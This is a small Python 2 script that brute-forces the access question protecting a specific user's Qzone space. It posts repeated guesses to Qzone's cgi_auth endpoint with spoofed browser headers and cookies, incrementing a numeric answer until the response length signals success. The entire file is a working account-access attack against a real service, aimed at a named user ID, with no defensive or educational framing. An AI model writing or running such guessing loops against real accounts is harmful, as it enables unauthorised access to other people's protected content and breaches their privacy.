#coding:utf-8
import urllib, urllib2, cookielib, time

posturl = 'http://base.qzone.qq.com/cgi-bin/user/cgi_auth?g_tk=5381'   
answer = -1
headers = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0', 
           'Referer' : 'http://user.qzone.qq.com/746058508/'}
 
cj = cookielib.LWPCookieJar()  
cookie_support = urllib2.HTTPCookieProcessor(cj)  
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)

urllib2.install_opener(opener)
           
def login(postData_temp): 
    req = urllib2.Request(posturl, postData_temp, headers)
    resp = opener.open(req)  
    result = resp.read()
    
    print len(result)
    
    if len(result) == 512:
        flag_login = True
    else:
        flag_login = False

    return flag_login
    

while not login(urllib.urlencode({'answer':answer, 'question':"一加二等于多少", 'uin':746058508, 'mode':2, 'fupdate':1, 'qzreferrer':"http://user.qzone.qq.com/746058508/" })):
    print "%s is not right"%answer
    answer += 1;

print answer



print 'find it %s'%answer

    
